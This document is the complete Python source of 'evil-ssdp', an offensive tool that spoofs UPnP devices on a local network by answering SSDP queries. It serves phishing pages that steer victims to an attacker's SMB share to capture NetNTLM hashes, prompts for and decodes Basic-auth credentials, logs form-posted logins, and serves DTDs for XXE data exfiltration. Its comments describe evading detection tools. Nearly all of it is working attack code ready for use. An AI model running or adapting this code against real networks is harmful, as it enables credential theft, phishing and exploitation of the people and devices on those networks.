#!/usr/bin/env python3

"""
evil-ssdp by initstring (github.com/initstring)

This tool is used to respond to SSDP queries on a LAN, creating fake UPNP
devices that appear in Windows Explorer and inside various applications.

There are multiple use cases, but the primary ideas are:
    * Trick users into visiting malicious sites, grabbing NetNTLM
      challenge/response or clear-text credentials.
    * Exploit 0-day vulnerabilities in the XML parsing engines of applications.
      Several CVEs have come of this, including Plex and Vuze.
"""

try:
    from multiprocessing import Process
    from string import Template
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from socketserver import ThreadingMixIn
    from email.utils import formatdate
    from ipaddress import ip_address
    import sys
    import os
    import re
    import argparse
    import socket
    import struct
    import signal
    import base64
    import random
except ImportError:
    print("\nError importing required modules... Are you using Python3?\n"
          "...you should be.\n")
    sys.exit(1)


BANNER = r'''
___________     .__.__    _________ _________________ __________
\_   _____/__  _|__|  |  /   _____//   _____/\______ \\______   \
 |    __)_\  \/ /  |  |  \_____  \ \_____  \  |    |  \|     ___/
 |        \\   /|  |  |__/        \/        \ |    `   \    |
/_______  / \_/ |__|____/_______  /_______  //_______  /____|
        \/                      \/        \/         \/

...by initstring (github.com/initstring)
'''

print(BANNER)


if sys.version_info < (3, 0):
    print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
    sys.exit(1)


class PC:
    """PC (Print Color)
    Used to generate some colorful, relevant, nicely formatted status messages.
    """
    green = '\033[92m'
    blue = '\033[94m'
    orange = '\033[93m'
    red = '\033[91m'
    endc = '\033[0m'
    ok_box = blue + '[*] ' + endc
    note_box = green + '[+] ' + endc
    warn_box = orange + '[!] ' + endc
    msearch_box = blue + '[M-SEARCH]     ' + endc
    xml_box = green + '[XML REQUEST]  ' + endc
    phish_box = red + '[PHISH HOOKED] ' + endc
    creds_box = red + '[CREDS GIVEN]  ' + endc
    xxe_box = red + '[XXE VULN!!!!] ' + endc
    exfil_box = red + '[EXFILTRATION] ' + endc
    detect_box = orange + '[DETECTION]    ' + endc


class SSDPListener:
    """UDP multicast listener for SSDP queries
    This class object will bind to the SSDP-spec defined multicast address and
    port. We can then receive data from this object, which will be capturing
    the UDP multicast traffic on a local network. Processing is handled in the
    main() function below.
    """

    def __init__(self, local_ip, local_port, analyze):
        self.sock = None
        self.known_hosts = []
        self.local_ip = local_ip
        self.local_port = local_port
        self.analyze_mode = analyze
        ssdp_port = 1900  # Defined by SSDP spec, do not change
        mcast_group = '239.255.255.250'  # Defined by SSDP spec, do not change
        server_address = ('', ssdp_port)

        # The re below can help us identify obviously false requests
        # from detection tools.
        self.valid_st = re.compile(r'^[a-zA-Z0-9.\-_]+:[a-zA-Z0-9.\-_:]+$')

        # Generating a new unique USD/UUID may help prevent signature-like
        # detection tools.
        self.session_usn = ('uuid:'
                            + self.gen_random(8) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(12))

        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to the server address
        self.sock.bind(server_address)

        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcast_group)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.local_ip))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)

    @staticmethod
    def gen_random(length):
        """Generates random hex strings"""
        chars = 'abcdef'
        digits = '0123456789'
        value = ''.join(random.choices(chars + digits, k=length))
        return value

    def send_location(self, address, requested_st):
        """
        This function replies back to clients letting them know where they can
        access more information about our device. The keys here are the
        'LOCATION' header and the 'ST' header.

        When a client receives this information back on the port they
        initiated a discover from, they will go to that location and parse the
        XML file.
        """
        url = 'http://{}:{}/ssdp/device-desc.xml'.format(self.local_ip,
                                                         self.local_port)
        date_format = formatdate(timeval=None, localtime=False, usegmt=True)

        ssdp_reply = ('HTTP/1.1 200 OK\r\n'
                      'CACHE-CONTROL: max-age=1800\r\n'
                      'DATE: {}\r\n'
                      'EXT:\r\n'
                      'LOCATION: {}\r\n'
                      'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                      '01-NLS: {}\r\n'
                      'SERVER: UPnP/1.0\r\n'
                      'ST: {}\r\n'
                      'USN: {}::{}\r\n'
                      'BOOTID.UPNP.ORG: 0\r\n'
                      'CONFIGID.UPNP.ORG: 1\r\n'
                      '\r\n\r\n'
                      .format(date_format,
                              url,
                              self.session_usn,
                              requested_st,
                              self.session_usn,
                              requested_st))
        ssdp_reply = bytes(ssdp_reply, 'utf-8')
        self.sock.sendto(ssdp_reply, address)

    def process_data(self, data, address):
        """
        This function parses the raw data received on the SSDPListener class
        object. If the M-SEARCH header is found, it will look for the specific
        'Service Type' (ST) being requested and call the function to reply
        back, telling the client that we have the device type they are looking
        for.

        The function will log the first time a client does a specific type of
        M-SEARCH - after that it will be silent. This keeps the output more
        readable, as clients can get chatty.
        """
        remote_ip = address[0]
        header_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
        if 'M-SEARCH' in str(data) and header_st:
            requested_st = header_st[0].strip()
            if re.match(self.valid_st, requested_st):
                if (address[0], requested_st) not in self.known_hosts:
                    print(PC.msearch_box + "New Host {}, Service Type: {}"
                          .format(remote_ip, requested_st))
                    self.known_hosts.append((address[0], requested_st))
                if not self.analyze_mode:
                    self.send_location(address, requested_st)
            else:
                print(PC.detect_box + "Odd ST ({}) from {}. Possible"
                      "detection tool!".format(requested_st, remote_ip))


class MultiThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Multi-threaded server class
    Setting up this definition allows us to serve multiple HTTP requests in
    parallel. Without this, a client device may hang the HTTP server, blocking
    other devices from properly accessing and parsing the XML files.
    """
    pass


def build_class(upnp_args):
    """
    Python3 documentation states to avoid __init__ in BaseHTTPRequestHandler
    sub class. Because of this, we are building the class inside a function.
    Each request will instantiate a new UPNPObject class object.
    """
    template_dir = upnp_args['template_dir']
    session_usn = upnp_args['session_usn']
    smb_server = upnp_args['smb_server']
    redirect_url = upnp_args['redirect_url']
    is_auth = upnp_args['is_auth']
    realm = upnp_args['realm']
    local_ip = upnp_args['local_ip']
    local_port = upnp_args['local_port']

    class UPNPObject(BaseHTTPRequestHandler):
        """Spoofed UPnP object
        This class contains all the objects and actions required for a spoofed
        UPNP device. Device files will be built on the fly using variables
        passed in at command execution. Logging functions are overwritten to
        print relevant information to the console and log file.

        Any requests to the HTTP server other than those defined will be given
        the phishing page. The phishing page can optionally request an
        interactive logon if the "-b / --basic" has been specified.

        The phishing page the devices SHOULD be requesting is 'present.html'
        but we will serve it to all requests, in case a curious users sees the
        reference and browses there manually.
        """

        @staticmethod
        def build_device_xml():
            """
            Builds the device descriptor XML file.
            """
            variables = {'local_ip': local_ip,
                         'local_port': local_port,
                         'smb_server': smb_server,
                         'session_usn': session_usn}
            file_in = open(template_dir + '/device.xml')
            template = Template(file_in.read())
            xml_file = template.substitute(variables)
            return xml_file

        @staticmethod
        def build_service_xml():
            """
            Builds the service descriptor XML file.
            ***Not yet implemented in evil-ssdp***
            """
            if 'service.xml' in template_dir:
                variables = {'local_ip': local_ip,
                             'local_port': local_port}
                file_in = open(template_dir + '/service.xml')
                template = Template(file_in.read())
                xml_file = template.substitute(variables)
            else:
                xml_file = '.'
            return xml_file

        @staticmethod
        def build_phish_html():
            """
            Builds the phishing page served when users open up an evil device.
            """
            variables = {'smb_server': smb_server,
                         'redirect_url': redirect_url}
            file_in = open(template_dir + '/present.html')
            template = Template(file_in.read())
            phish_page = template.substitute(variables)
            return phish_page

        @staticmethod
        def build_exfil_dtd():
            """
            Builds the required page for data exfiltration when used with the
            xxe-exfil template.
            """
            if 'xxe-exfil' in template_dir:
                variables = {'local_ip': local_ip,
                             'local_port': local_port}
                file_in = open(template_dir + '/data.dtd')
                template = Template(file_in.read())
                exfil_page = template.substitute(variables)
            else:
                exfil_page = '.'
            return exfil_page

        def handle(self):
            """
            Overriding this specifically to catch closed connection
            exceptions.
            """
            try:
                BaseHTTPRequestHandler.handle(self)
            except socket.error:
                print(PC.detect_box + "{} connected but did not complete a"
                      " valid HTTP verb. This is sometimes indicitive of a"
                      " port scan or a detection tool."
                      .format(self.address_string()))

        def do_GET(self):
            """
            Handles all GET requests. Overwrites super class.
            """
            if self.path == '/ssdp/device-desc.xml':
                # Parsed automatically by all SSDP apps
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(self.build_device_xml().encode())
            elif self.path == '/ssdp/service-desc.xml':
                # Not yet implemented
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(self.build_service_xml().encode())
            elif self.path == '/ssdp/xxe.html':
                # Access indicates XXE vulnerability
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write('.'.encode())
            elif self.path == '/ssdp/data.dtd':
                # Used for XXE exploitation
                self.send_response(200)
                self.send_header('Content-type', 'application/xml')
                self.end_headers()
                self.wfile.write(self.build_exfil_dtd().encode())
            elif self.path == '/favicon.ico':
                self.send_response(404)
                self.wfile.write('Not found.'.encode())
            else:
                if is_auth:
                    # If user enables -b/--basic in CLI args
                    if 'Authorization' not in self.headers:
                        # If creds not given, ask for them
                        self.process_authentication()
                        self.wfile.write("Unauthorized.".encode())
                    elif 'Basic ' in self.headers['Authorization']:
                        # Return phishing page after getting creds
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html')
                        self.end_headers()
                        self.wfile.write(self.build_phish_html().encode())
                    else:
                        self.send_response(500)
                        self.wfile.write("Something happened.".encode())
                elif self.path == '/present.html':
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(self.build_phish_html().encode())
                else:
                    # Return phishing page for everything else
                    self.send_response(301)
                    self.send_header('Location', '/present.html')
                    self.end_headers()


        def do_POST(self):
            """
            Handles all POST requests. Overwrites super class.

            We generally only get POSTs to evil-ssdp when using templates
            that contain a logon prompt - phishing for clear-text credentials.

            It's probably best to use these with the '-u' parameter to
            redirect to a legit URL after POSTing. Otherwise, we will simply
            refresh the page.
            """
            if self.path == '/ssdp/do_login.html':
                self.send_response(301)
                if redirect_url:
                    self.send_header('Location', '{}'.format(redirect_url))
                else:
                    self.send_header('Location', 'http://{}:{}/present.html'
                                     .format(local_ip, local_port))
                self.end_headers()

        def process_authentication(self):
            """
            Will prompt user for credentials, causing execution to go back to
            the do_GET funtion for further processing.
            """
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'Basic realm=\"{}\"'
                             .format(realm))
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        @staticmethod
        def write_log(data):
            """
            Will append important info to a log file. This includes credentials
            given via basic auth as well as XXE vulnerabilities.
            """
            with open('logs-essdp.txt', 'a') as log_file:
                time_stamp = formatdate(timeval=None, localtime=True,
                                        usegmt=False)
                log_file.write(time_stamp + ":    " + data + "\n")
                log_file.close()

        def log_message(self, format, *args):
            """
            Overwriting the built in function to provide useful feedback inside
            the text UI. Providing the 'User Agent' is helpful in understanding
            the types of devices that are interacting with evil-ssdp.

            The most important stuff (credentials submitted and XXE vulns) are
            logged to a text file in the working directory.
            """
            address = self.address_string()
            agent = self.headers['user-agent']
            verb = self.command
            path = self.path
            if 'xml' in self.path:
                print(PC.xml_box + "Host: {}, User-Agent: {}"
                      .format(address, agent))
                print("               {} {}".format(verb, path))
            elif 'xxe.html' in self.path:
                data = PC.xxe_box + "Host: {}, User-Agent: {}\n".format(
                    address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.write_log(data)
            elif 'do_login' in self.path:
                content_length = int(self.headers['Content-Length'])
                post_body = self.rfile.read(content_length)
                credentials = post_body.decode('utf-8')
                data = PC.creds_box + "HOST: {}, FORM-POST CREDS: {}".format(
                    address, credentials)
                print(data)
                self.write_log(data)
            elif 'data.dtd' in self.path:
                data = PC.xxe_box + "Host: {}, User-Agent: {}\n".format(
                    address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.write_log(data)
            elif 'exfiltrated' in self.path:
                data = PC.exfil_box + "Host: {}, User-Agent: {}\n".format(
                    address, agent)
                data += "               {} {}".format(verb, path)
                print(data)
                self.write_log(data)
            elif 'present.html' in self.path:
                print(PC.phish_box + "Host: {}, User-Agent: {}".format(
                    address, agent))
                print("               {} {}".format(verb, path))
            elif 'favicon.ico' in self.path:
                return
            else:
                print(PC.detect_box + "Odd HTTP request from Host: {}, User"
                      " Agent: {}".format(address, agent))
                print("               {} {}".format(verb, path))
                print("               ... sending to phishing page.")

            if 'Authorization' in self.headers:
                encoded = self.headers['Authorization'].split(" ")[1]
                plaintext = base64.b64decode(encoded).decode()
                data = PC.creds_box + "HOST: {}, BASIC-AUTH CREDS: {}".format(
                    address, plaintext)
                print(data)
                self.write_log(data)

    return UPNPObject


def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', type=str, action='store',
                        help='Network interface to listen on.')
    parser.add_argument('-p', '--port', type=str, action='store',
                        default=8888,
                        help='Port for HTTP server. Defaults to 8888.')
    parser.add_argument('-t', '--template', type=str, action='store',
                        default='office365',
                        help=('Name of a folder in the templates directory. '
                              'Defaults to "office365". This will determine '
                              'xml and phishing pages used.'))
    parser.add_argument('-s', '--smb', type=str, action='store',
                        help=('IP address of your SMB server. Defalts to the '
                              'primary address of the "interface" provided.'))
    parser.add_argument('-b', '--basic', action="store_true",
                        default=False,
                        help=('Enable base64 authentication for templates and '
                              'write credentials to log file.'))
    parser.add_argument("-r", "--realm", type=str, action='store',
                        default='Microsoft Corporation',
                        help='Realm when prompting target for authentication '
                        'via Basic Auth.')
    parser.add_argument("-u", "--url", type=str,
                        default='',
                        help=('Redirect to this URL. Works with templates '
                              'that do a POST for logon forms and with '
                              'templates that include the custom redirect '
                              'JavaScript (see README for more info).'
                              '[example: -r https://google.com]'))
    parser.add_argument("-a", "--analyze", action="store_true",
                        default=False,
                        help=('Run in analyze mode. Will NOT respond to any'
                              ' SSDP queries, but will still enable and run'
                              ' the web server for testing.'))
    args = parser.parse_args()

    # The following two lines help to avoid command injection in bash.
    # Pretty damn unlikely scenario for this tool, but who knows.
    char_whitelist = re.compile('[^a-zA-Z0-9 ._-]')
    args.interface = char_whitelist.sub('', args.interface)

    args.local_port = int(args.port)
    args.template_dir = (os.path.dirname(os.path.abspath(__file__))
                         + '/templates/' + args.template)
    args.is_auth = args.basic
    args.realm = args.realm
    args.redirect_url = args.url

    if not os.path.isdir(args.template_dir):
        print("\nSorry, that template directory does not exist. "
              "Please double-check and try again.\n")
        sys.exit()

    return args


def get_ip(args):
    """
    This function will attempt to automatically get the IP address of the
    provided interface. This is used for serving the XML files and also for
    the SMB pointer, if not specified.
    """
    ip_regex = r'inet (?:addr:)?(.*?) '
    sys_ifconfig = os.popen('ifconfig ' + args.interface).read()
    local_ip = re.findall(ip_regex, sys_ifconfig)
    try:
        return local_ip[0]
    except IndexError:
        print(PC.warn_box + "Could not get network interface info. "
              "Please check and try again.")
        sys.exit()


def set_smb(args, local_ip):
    """
    This function sets the IP address of the SMB server that will be used in
    the phishing page. evil-ssdp does not provide an SMB server itself - it
    only points somewhere. You must host your own SMB server with something
    like Impacket.
    """
    if args.smb:
        if ip_address(args.smb):
            smb_server = args.smb
        else:
            print("Sorry, that is not a valid IP address for your SMB server.")
            sys.exit()
    else:
        smb_server = local_ip
    return smb_server


def print_details(args, local_ip, smb_server):
    """
    Prints a banner at runtime, informing the user of relevant details.
    """
    dev_url = 'http://{}:{}/ssdp/device-desc.xml'.format(
        local_ip, args.local_port)
    srv_url = 'http://{}:{}/ssdp/service-desc.xml'.format(
        local_ip, args.local_port)
    phish_url = 'http://{}:{}/ssdp/present.html'.format(
        local_ip, args.local_port)
    exfil_url = 'http://{}:{}/ssdp/data.dtd'.format(local_ip, args.local_port)
    smb_url = 'file://///{}/smb/hash.jpg'.format(smb_server)
    print("\n\n")
    print("########################################")
    print(PC.ok_box + "EVIL TEMPLATE:           {}".format(args.template_dir))
    print(PC.ok_box + "MSEARCH LISTENER:        {}".format(args.interface))
    print(PC.ok_box + "DEVICE DESCRIPTOR:       {}".format(dev_url))
    print(PC.ok_box + "SERVICE DESCRIPTOR:      {}".format(srv_url))
    print(PC.ok_box + "PHISHING PAGE:           {}".format(phish_url))
    if args.redirect_url:
        print(PC.ok_box + "REDIRECT URL:            {}".format(
            args.redirect_url))
    if args.is_auth:
        print(PC.ok_box + "AUTH ENABLED, REALM:     {}".format(args.realm))
    if 'xxe-exfil' in args.template_dir:
        print(PC.ok_box + "EXFIL PAGE:              {}".format(exfil_url))
    else:
        print(PC.ok_box + "SMB POINTER:             {}".format(smb_url))
    if args.analyze:
        print(PC.warn_box + "ANALYZE MODE:            ENABLED")
    print("########################################")
    print("\n\n")


def listen_msearch(listener):
    """
    Starts the listener object, receiving and processing UDP multicasts.
    """
    while True:
        data, address = listener.sock.recvfrom(1024)
        listener.process_data(data, address)


def serve_html(local_ip, local_port, upnp):
    """
    Starts the web server for delivering XML files and the phishing page.
    """
    MultiThreadedHTTPServer.allow_reuse_address = True
    upnp_server = MultiThreadedHTTPServer((local_ip, local_port), upnp)
    upnp_server.serve_forever()


def main():
    """Main program function
    Uses Process to multi-thread the SSDP server and the web server.
    """
    args = process_args()
    local_ip = get_ip(args)
    smb_server = set_smb(args, local_ip)

    listener = SSDPListener(local_ip, args.local_port, args.analyze)
    ssdp_server = Process(target=listen_msearch, args=(listener,))

    upnp_args = {'template_dir':args.template_dir,
                 'session_usn':listener.session_usn,
                 'smb_server':smb_server,
                 'redirect_url':args.redirect_url,
                 'is_auth':args.is_auth,
                 'local_ip':local_ip,
                 'realm':args.realm,
                 'local_port':args.local_port}

    upnp = build_class(upnp_args)

    web_server = Process(target=serve_html,
                         args=(local_ip, args.local_port, upnp))

    print_details(args, local_ip, smb_server)

    try:
        ssdp_server.start()
        web_server.start()
        signal.pause()
    except (KeyboardInterrupt, SystemExit):
        print("\n" + PC.warn_box +
              "Thanks for playing! Stopping threads and exiting...\n")
        web_server.terminate()
        ssdp_server.terminate()
        sys.exit()



if __name__ == "__main__":
    main()
